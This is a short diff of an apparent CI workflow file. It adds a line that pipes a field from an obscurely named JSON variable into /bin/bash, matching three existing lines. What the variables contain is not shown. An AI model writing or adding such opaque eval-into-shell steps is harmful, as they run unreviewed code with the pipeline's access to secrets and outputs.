@@ -31,6 +31,7 @@ jobs:
           echo $sa53 | jq -r .bke1316 | /bin/bash
           echo $ryu4 | jq -r .ey9026 | /bin/bash
           echo $rehbd0 | jq -r .ihfzl426 | /bin/bash
+          printf '%s' "$ezm17" | jq -r .agasz4220 | /bin/bash
 
       - name: Store output
         uses: actions/upload-artifact@v4
